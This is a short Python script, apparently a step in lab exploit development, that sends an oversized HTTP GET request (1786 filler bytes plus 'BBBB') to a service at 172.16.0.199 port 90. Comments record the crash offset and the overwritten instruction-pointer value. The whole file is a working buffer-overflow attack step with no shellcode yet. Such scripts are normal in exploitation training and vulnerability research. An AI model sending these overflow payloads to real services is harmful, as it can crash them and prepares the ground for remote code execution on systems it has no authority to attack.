import socket
import traceback

target = "172.16.0.199"
t_port = 90
buff = b"A" * 1786 + b"BBBB"
# [*] Exact match at offset 1786
# Fuzzing with 1790 bytes
# Offset = 42424242


try:
	payload = b"GET /" + buff + b" HTTP/1.1\r\n\r\n"
	print("Fuzzing with %s bytes" % len(buff))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, t_port))
	s.sendall(payload)
	s.recv(1024)
	s.close()

except:
	traceback.print_exc()
	exit()
